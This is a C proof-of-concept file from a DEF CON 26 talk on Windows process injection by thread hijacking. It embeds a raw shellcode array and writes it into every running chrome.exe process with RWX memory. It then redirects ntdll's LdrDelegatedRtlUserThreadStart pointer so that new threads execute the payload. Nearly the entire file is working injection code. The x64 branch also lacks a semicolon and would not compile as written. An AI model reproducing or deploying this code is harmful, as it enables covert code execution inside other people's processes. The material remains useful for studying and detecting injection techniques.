/**
 * DEF CON 26:
 * Playing Malware Injection with Exploit thoughts
 * PoC 4 - Thread Hijack
 * by aaaddress1@chroot.org
 */
#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h> 

unsigned char buf[] = \
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52" \
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48" \
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9" \
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41" \
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48" \
"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01" \
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48" \
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0" \
"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c" \
"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0" \
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04" \
"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59" \
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48" \
"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00" \
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f" \
"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff" \
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb" \
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64" \
"\x00";

void inject(DWORD pid) {

	#ifdef _WIN64
		UINT64 ptrUsrThrdStrt = (UINT64)GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlUserThreadStart");
		printf("RtlUserThreadStart @ %llx\n", ptrUsrThrdStrt);

		UINT64 offsetVia = *(UINT32 *)(ptrUsrThrdStrt + 0x1b + 2);
		offsetVia = (ptrUsrThrdStrt + 0x1b) + offsetVia + 6;
		printf("LdrDelegatedRtlUserThreadStart @ %llx\n", offsetVia);

		// write shellcode
		HANDLE access_token = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);
		LPVOID alloc_mem = VirtualAllocEx(access_token, NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		WriteProcessMemory(access_token, alloc_mem, &buf, sizeof(buf), NULL);
		printf("shellcode @ %llx\n", alloc_mem);

		// write LdrDelegatedRtlUserThreadStart
		WriteProcessMemory(access_token, LPVOID(offsetVia), &alloc_mem, 8, NULL)

	#else
		UINT32 ptrUsrThrdStrt = (UINT32)GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlUserThreadStart");
		printf("RtlUserThreadStart @ %llx\n", ptrUsrThrdStrt);

		UINT32 offsetVia = *(UINT32 *)(ptrUsrThrdStrt + 0x0A);
		offsetVia = (ptrUsrThrdStrt + 0x07) + offsetVia + 7;
		printf("LdrDelegatedRtlUserThreadStart @ %llx\n", offsetVia);

		// write shellcode
		HANDLE access_token = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);
		LPVOID alloc_mem = VirtualAllocEx(access_token, NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		WriteProcessMemory(access_token, alloc_mem, &buf, sizeof(buf), NULL);
		printf("shellcode @ %llx\n", alloc_mem);

		// write LdrDelegatedRtlUserThreadStart
		WriteProcessMemory(access_token, LPVOID(offsetVia), &alloc_mem, 4, NULL);
	#endif
}


void inject_via_name(const char proc_name[]) {
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 process = { 0 };
	process.dwSize = sizeof(process);

	if (Process32First(snapshot, &process))
		while (Process32Next(snapshot, &process))
			if (!stricmp(process.szExeFile, proc_name))
				inject(process.th32ProcessID);

	CloseHandle(snapshot);
}

int main(void) {
	inject_via_name("chrome.exe");
	return 0;
}